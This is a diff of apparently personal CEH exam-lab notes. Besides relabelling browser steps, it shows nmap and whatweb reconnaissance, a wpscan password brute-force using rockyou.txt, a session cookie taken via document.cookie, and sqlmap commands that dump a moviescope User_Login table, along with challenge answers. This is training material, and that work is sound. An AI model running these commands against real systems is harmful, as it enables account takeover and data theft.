@@ -158,10 +158,6 @@ owasp-zap
 ### Alerts → Content Security Policy (CSP) Header Not Set
 ### INFO: Source → Passive (10038 - Content Security Policy (CSP) Header Not Set)
 
-# ⚠️ IMPORTANT COMMANDS
-# nmap -sV 172.30.10.200
-# nmap -O 10 172.30.10.200
-# nmap -O --osscan-guess --max-os-tries 10 172.30.10.200
 
 #------------------------------#
 
@@ -200,7 +196,7 @@ grep -i "sensitive files" report.txt
 nmap -p- --open www.cehorg.com
 whatweb http://www.cehorg.com:80
 whatweb http://www.cehorg.com:8080
-#### GOOGLE: http://www.cehorg.com:8080
+#### MOZILLA FIREFOX: http://www.cehorg.com:8080
 ### INFO: You Projects (2) → CEH, DVWA
 whatweb http://www.cehorg.com:8080/CEH
 curl -I http://www.cehorg.com:8080/CEH
@@ -248,13 +244,13 @@ wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P rockyou.txt
 
 # PART III - Challenge 14 💬ANSWER: 5💬
 # PART III - Challenge 15 💬ANSWER: 19💬
-#### GOOGLE: http://www.moviescope.com/ # Realizar login 
+#### MOZILLA FIREFOX: http://www.moviescope.com/ # Realizar login 
 ### USERNAME: lee
 ### PASSWORD: test
 ### PATH: Contacts → View Profile
 ### PATH: Ctrl + Shift + I (Developer Tools) → Concole → document.cookie
 ### INFO: "mscope=WNklabw/oq4=; ui-tabs-1=0"
-#### GOOGLE: http://www.moviescope.com/viewprofile.aspx?id=1 
+#### MOZILLA FIREFOX: http://www.moviescope.com/viewprofile.aspx?id=1 
 sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -dbs --batch
 ### INFO: available databases [9] ... [*] moviescope ...
 sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope --tables --batch
@@ -262,7 +258,7 @@ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNk
 sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope -T User_Login --dump --batch
 ### INFO: [5 entries] ... Uid → 5
 
-#### GOOGLE: WASC ID SQL INJECTION 
+#### MOZILLA FIREFOX: WASC ID SQL INJECTION 
 ### INFO: WASC-19
 ### INFO: http://projects.webappsec.org/w/page/13246963/SQL Injection
 
